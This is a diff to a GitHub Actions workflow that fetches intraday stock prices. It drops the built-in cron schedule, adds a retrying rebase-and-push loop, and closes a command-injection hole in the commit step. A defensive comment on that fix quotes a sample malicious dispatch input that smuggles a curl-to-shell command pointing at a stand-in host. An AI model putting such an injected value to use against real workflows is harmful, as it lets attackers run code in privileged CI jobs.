@@ -7,30 +7,26 @@ on:
         description: "Comma-separated tickers (e.g. AAPL,MSFT,NVDA); empty = watchlist"
         required: false
         type: string
-  schedule:
-    # every 20 min during US market hours (13:30-20:00 UTC, EDT); fetches the
-    # watchlist (Finnhub-compatible symbols only) so intraday.json stays fresh
-    # without anyone needing GitHub auth
-    # off-peak minute marks: GitHub skips/delays busy slots like :00/:20/:40.
-    # Ends at 19:43 UTC (3:43pm EDT) so the last snapshot freezes ~15 min
-    # before the close - a stable pre-close mark until the EOD job publishes.
-    # NOTE: this cron can go silent while the workflow still reports "active",
-    # the run queue is empty, and workflow_dispatch works perfectly - GitHub
-    # just stops creating scheduled runs. Delivery degrades progressively
-    # before it stops: ~15 scheduled runs/day on 8/24-8/25, 6 on 8/26, 1 on
-    # 8/27, then 12h+ of nothing.
-    # Nothing repo-side fixes this. Disproven on 2026-08-27, in this order:
-    #   - pushing a commit to main (data commit at 03:02 UTC, next four slots
-    #     still missed) - so the old "any commit re-registers it" advice is wrong
-    #   - gh workflow disable + enable
-    #   - editing this file and pushing
-    # After all three, the 15:03 and 15:23 slots still never fired. Context was
-    # the 8/26-8/27 Actions incidents plus an unresolved GitHub billing
-    # incident; cause was never confirmed as repo-side.
-    # So: don't chase re-registration. Check githubstatus.com, and keep the
-    # data fresh with `gh workflow run intraday-prices.yml` - dispatch has
-    # never failed - until scheduled delivery resumes on GitHub's side.
-    - cron: "3,33 13-19 * * 1-5"   # every 30 min; trimmed from every 20 on 2026-09-03 (Actions budget, jr-dash #15)
+
+# NO `schedule:` BLOCK. Deleted 2026-09-13.
+#
+# The scheduler is the cron-dispatch Cloudflare Worker (jr-dash/cron-dispatch),
+# which sweeps every 10 minutes and dispatches this workflow's 13:00-19:59 UTC
+# weekday slots at :03 and :33. GitHub's own cron sat here as "free redundancy".
+# It was not free:
+#
+#   - It delivered 23 of 189 slots since 8/28 (12%), a median 17-27 min late,
+#     and it kept delivering AFTER the bell (20:07, 20:11, 21:44, 21:45, 23:01,
+#     23:26 UTC). Each of those commits overwrote the frozen pre-close mark this
+#     job is designed to leave with a post-close or next-morning one.
+#   - Two runs rewriting the same whole-file snapshot is precisely the rebase
+#     conflict that kept this workflow red (issue #5, 8 of 13 failures).
+#   - It produced essentially all of the _alert-failure noise.
+#
+# A late fallback that overwrites on-design data is worse than no fallback. The
+# manual path is unchanged and has never once failed:
+#   gh workflow run intraday-prices.yml --repo jhirgit/daily-prices
+# Worker liveness: curl -s https://jr-cron-dispatch.jakeradencom.workers.dev/heartbeat
 
 permissions:
   contents: write
@@ -56,23 +52,44 @@ jobs:
         run: python scripts/fetch_intraday.py
 
       - name: Commit results
+        # TICKERS is read as a shell VARIABLE, never interpolated into the
+        # command line. `${{ inputs.tickers }}` expands before the shell sees it,
+        # so a dispatch input of `x" ; curl evil.sh | sh ; echo "` would run
+        # inside a job holding `contents: write` on a public repo - and anyone
+        # holding the Worker's Actions-scoped PAT can dispatch this workflow.
+        env:
+          TICKERS: ${{ inputs.tickers }}
         run: |
-          git config user.name "github-actions[bot]"
-          git config user.email "github-actions[bot]@users.noreply.github.com"
+          git config user.name  "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
           git add data/intraday.json data/history
           if git diff --staged --quiet; then
             echo "No changes to commit"
           else
-            git commit -m "intraday: ${{ inputs.tickers || 'watchlist' }} [skip ci]"
-            git pull --rebase
-            git push
+            git commit -m "intraday: ${TICKERS:-watchlist} [skip ci]"
+            # data/intraday.json is a whole-file SNAPSHOT, regenerated from
+            # scratch every run -- it is never merged, so `-X theirs` (during a
+            # rebase: the replayed commit, i.e. this run's newer snapshot) is the
+            # only correct resolution. Without it every queued run died on
+            # "CONFLICT (content): Merge conflict in data/intraday.json"
+            # (issue #5). The loop covers the other half: `! [rejected] main ->
+            # main (fetch first)` when another job pushed between our fetch and
+            # our push. Jittered sleep so two racers do not re-collide in step.
+            for i in 1 2 3 4 5; do
+              git pull --rebase -X theirs && git push && exit 0
+              sleep $((RANDOM % 20 + 5))
+            done
+            exit 1
           fi
 
   # A silent cron is the failure mode this repo actually has: nothing here
   # reported a broken run until someone noticed stale prices downstream.
   alert:
     needs: fetch
-    if: failure()
+    # Conditional on ITS OWN job, not a bare failure(). `failure()` is transitive
+    # over the needs chain ("true if any ancestor job fails"), so one root cause
+    # would open one issue per alert job.
+    if: failure() && needs.fetch.result == 'failure'
     uses: ./.github/workflows/_alert-failure.yml
     with:
       workflow: Intraday Prices
